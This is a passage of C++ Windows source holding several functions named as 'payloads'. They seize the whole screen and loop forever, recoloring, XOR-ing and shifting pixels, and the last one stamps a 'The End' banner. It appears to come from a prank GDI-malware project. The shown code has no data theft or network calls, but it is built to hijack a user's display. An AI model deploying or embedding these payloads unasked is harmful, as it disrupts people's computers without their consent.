        bmi.bmiHeader.biBitCount = 32;
        bmi.bmiHeader.biCompression = BI_RGB;

        RGBQUAD* pixels = nullptr;
        HBITMAP bmp = CreateDIBSection(dc, &bmi, DIB_RGB_COLORS, (void**)&pixels, NULL, 0);
        SelectObject(memDC, bmp);

        SetStretchBltMode(dc, COLORONCOLOR);
        SetStretchBltMode(memDC, COLORONCOLOR);

        int i = 0;

        while (true)
        {
            StretchBlt(memDC, 0, 0, ws, hs, dc, 0, 0, w, h, SRCCOPY);

            for (int y = 0; y < hs; y++)
            {
                for (int x = 0; x < ws; x++)
                {
                    int index = y * ws + x;

                    int cx = abs(x - ws / 2);
                    int cy = abs(y - hs / 2);

                    int zx = (int)(cos(angle) * cx - sin(angle) * cy);
                    int zy = (int)(sin(angle) * cx + cos(angle) * cy);

                    int ZXii = zx * zx + i;
                    int ZYii = zy * zy + i;

                    int fx = (ZXii + ZYii) / 500;

                    HSV hsv = Colors::RGBtoHSV(pixels[index]);

                    // 🔥 HUE ONLY (no s/v touched)
                    hsv.h = fmod((FLOAT)(fx + i), 360.0f);

                    pixels[index] = Colors::HSVtoRGB(hsv);
                }
            }

            i++;
            angle += 0.01;

            StretchBlt(dc, 0, 0, w, h, memDC, 0, 0, ws, hs, SRCCOPY);

            Sleep(rand() % 1000);
        }

        return 0;
    }
}
namespace p10 {
    typedef struct TRGBQUAD {
        BYTE rgbBlue;
        BYTE rgbGreen;
        BYTE rgbRed;
        BYTE rgbReserved;
    } TRGBQUAD;
    payload WINAPI GDI(LPVOID lpParam)
    {

        // Get screen dimensions
        int w = GetSystemMetrics(SM_CXSCREEN);
        int h = GetSystemMetrics(SM_CYSCREEN);

        HDC dc = GetDC(NULL);
        HDC dcCopy = CreateCompatibleDC(dc);

        int ws = w / 2;
        int hs = h / 2;

        BITMAPINFO bmpi = { 0 };
        HBITMAP bmp;

        bmpi.bmiHeader.biSize = sizeof(bmpi.bmiHeader);
        bmpi.bmiHeader.biWidth = ws;
        bmpi.bmiHeader.biHeight = hs;
        bmpi.bmiHeader.biPlanes = 1;
        bmpi.bmiHeader.biBitCount = 32;
        bmpi.bmiHeader.biCompression = BI_RGB;

        TRGBQUAD* rgbquad = NULL;

        bmp = CreateDIBSection(dc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
        SelectObject(dcCopy, bmp);

        DOUBLE angle = 0.0;

        while (true) {
            // Copy original screen to buffer
            StretchBlt(dcCopy, 0, 0, ws, hs, dc, 0, 0, w, h, SRCCOPY);

            // Parallel pixel manipulation
#pragma omp parallel for
            for (int y = 0; y < hs; y++) {
                for (int x = 0; x < ws; x++) {
                    int index = y * ws + x;
                    int average = round((float)(rgbquad[index].rgbBlue + rgbquad[index].rgbRed + rgbquad[index].rgbGreen) / 8); //kept 

                    int fx = average + 10; //kept do not modified! 

                    rgbquad[index].rgbRed += fx + cbrt(x & y); //keep 
                    rgbquad[index].rgbGreen += fx + cbrt(x + y); //keep 
                    rgbquad[index].rgbBlue += fx + cbrt(x ^ y); //keep 
                }
            }

            angle += 0.01;

            // Draw back to screen
            StretchBlt(dc, 0, 0, w, h, dcCopy, 0, 0, ws, hs, SRCCOPY);

            Sleep(1); // slowed down loop
        }

        return 0;
    }
}
namespace p11 {

    // Define TRGBQUAD structure
    typedef struct TRGBQUAD {
        BYTE rgbBlue;
        BYTE rgbGreen;
        BYTE rgbRed;
        BYTE rgbReserved;
    } TRGBQUAD;
    payload WINAPI GDI(LPVOID lpParam)
    {

        // Screen dimensions
        int w = GetSystemMetrics(0);
        int h = GetSystemMetrics(1);

        // Get device contexts
        HDC dc = GetDC(NULL);
        HDC dcCopy = CreateCompatibleDC(dc);

        int ws = w / 2;
        int hs = h / 2;

        // Set up bitmap info
        BITMAPINFO bmpi = { 0 };
        bmpi.bmiHeader.biSize = sizeof(bmpi);
        bmpi.bmiHeader.biWidth = ws;
        bmpi.bmiHeader.biHeight = hs;
        bmpi.bmiHeader.biPlanes = 1;
        bmpi.bmiHeader.biBitCount = 32;
        bmpi.bmiHeader.biCompression = BI_RGB;

        // Create DIB section
        TRGBQUAD* rgbquad = nullptr;
        HBITMAP bmp = CreateDIBSection(dc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
        SelectObject(dcCopy, bmp);

        double angle = 0.0;

        while (1) {
            // Stretch screen content into our small buffer
            StretchBlt(dcCopy, 0, 0, ws, hs, dc, 0, 0, w, h, SRCCOPY);

            // Parallelized pixel manipulation
#pragma omp parallel for collapse(2)
            for (int y = 0; y < hs; y++) {
                for (int x = 0; x < ws; x++) {
                    int index = y * ws + x;
                    rgbquad[index].rgbRed += 69;
                    rgbquad[index].rgbGreen *= 2;
                    rgbquad[index].rgbBlue += 96;
                }
            }

            angle += 0.01;

            // Stretch modified image back to full screen
            StretchBlt(dc, 0, 0, w, h, dcCopy, 0, 0, ws, hs, SRCCOPY);

            // BitBlt train effect
            HDC hdc = GetDC(0);
            BitBlt(hdc, -30, 0, w, h, hdc, 0, 0, SRCCOPY);
            BitBlt(hdc, w - 30, 0, w, h, hdc, 0, 0, SRCCOPY);
            ReleaseDC(0, hdc);

            Sleep(rand() % 10);
        }

        // Cleanup (unreachable, but good practice)
        DeleteDC(dcCopy);
        ReleaseDC(NULL, dc);
        DeleteObject(bmp);

        return 0;
    }
}
namespace p12 {
    typedef struct TRGBQUAD {
        BYTE rgbBlue;
        BYTE rgbGreen;
        BYTE rgbRed;
        BYTE rgbReserved;
    } TRGBQUAD;
    payload WINAPI GDI(LPVOID lpParam)
    {

        // Assume some screen width and height
        const int w = GetSystemMetrics(SM_CXSCREEN);
        const int h = GetSystemMetrics(SM_CYSCREEN);

        HDC dc = GetDC(NULL);
        HDC dcCopy = CreateCompatibleDC(dc);

        int ws = w / 2;
        int hs = h / 2;

        BITMAPINFO bmpi = { 0 };
        HBITMAP bmp;

        bmpi.bmiHeader.biSize = sizeof(bmpi);
        bmpi.bmiHeader.biWidth = ws;
        bmpi.bmiHeader.biHeight = hs;
        bmpi.bmiHeader.biPlanes = 1;
        bmpi.bmiHeader.biBitCount = 32;
        bmpi.bmiHeader.biCompression = BI_RGB;

        TRGBQUAD* rgbquad = NULL;

        bmp = CreateDIBSection(dc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
        SelectObject(dcCopy, bmp);

        INT i = 0;
        DOUBLE angle = 0.f;

        while (1)
        {
            // Copy screen into smaller buffer
            StretchBlt(dcCopy, 0, 0, ws, hs, dc, 0, 0, w, h, SRCCOPY);

            // Parallelize pixel manipulation
#pragma omp parallel for collapse(2)
            for (int y = 0; y < hs; y++)
            {
                for (int x = 0; x < ws; x++)
                {
                    int index = y * ws + x;

                    rgbquad[index].rgbRed = x + y;
                    rgbquad[index].rgbGreen ^= y;
                    rgbquad[index].rgbBlue ^= x;
                    rgbquad[index].rgbReserved = 0;
                }
            }

            i++;
            angle += 0.01f;

            // Draw back to full screen
            StretchBlt(dc, 0, 0, w, h, dcCopy, 0, 0, ws, hs, SRCERASE);

            Sleep(rand() % 10);

            if (rand() % 25 == 0)
            {
                // Placeholder for random effects
            }
        }

        // Cleanup (never reached in infinite loop, but good practice)
        DeleteObject(bmp);
        DeleteDC(dcCopy);
        ReleaseDC(NULL, dc);

        return 0x00;
    }
}

payload WINAPI theendof2025(LPVOID lpParam) { // credits to camellia-y7x, but i modified it
    HBRUSH hBrush = NULL;
    while (true) {
        int w = GetSystemMetrics(0);
        int h = GetSystemMetrics(1);
        HDC hdc = GetDC(0);
        HDC hcdc = CreateCompatibleDC(hdc);
        HBITMAP hBitmap = CreateCompatibleBitmap(hdc, w, h);
        SelectObject(hcdc, hBitmap);

        hBrush = CreateSolidBrush(RGB(0, 0, 0));
        SelectObject(hcdc, hBrush);
        BitBlt(hcdc, 0, 0, w, h, hcdc, 0, 0, PATINVERT);
        DeleteObject(hBrush);

        hBrush = CreateSolidBrush(RGB(174, 0, 174));
        SelectObject(hcdc, hBrush);
        BitBlt(hcdc, (w / 2) - 162, (h / 2) - 50, 290, 100, hcdc, 0, 0, PATCOPY);
        DeleteObject(hBrush);

        LPCSTR text = "The End";
        SetTextColor(hcdc, 0);
        SetBkMode(hcdc, 0);

        HFONT hFont = CreateFontA(
            35, 15, 0, 0,
            FW_NORMAL, 0, 0, 0,
            ANSI_CHARSET, 0, 0, 0, 0,
            "Comic Sans MS"
        );
        SelectObject(hcdc, hFont);

        TextOutA(hcdc, (w / 2) - 80, (h / 2) - 19, text, strlen(text));
        DeleteObject(hFont);

        for (int i = 0; i < 100; i++) {
            int x = ((w / 2) - 164);
            int y = ((h / 2) - 50) + i;
            StretchBlt(
                hcdc,
                x - 2 + (rand() % 5), y,
                325, 1,
                hcdc,
                x - 2 + (rand() % 5), y,
                325, 1,
                SRCCOPY
            );
        }

        BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);

        ReleaseDC(0, hdc);
        ReleaseDC(0, hcdc);
        DeleteObject(hBitmap);
        DeleteDC(hcdc);
        DeleteDC(hdc);
    }

    return 0;
}

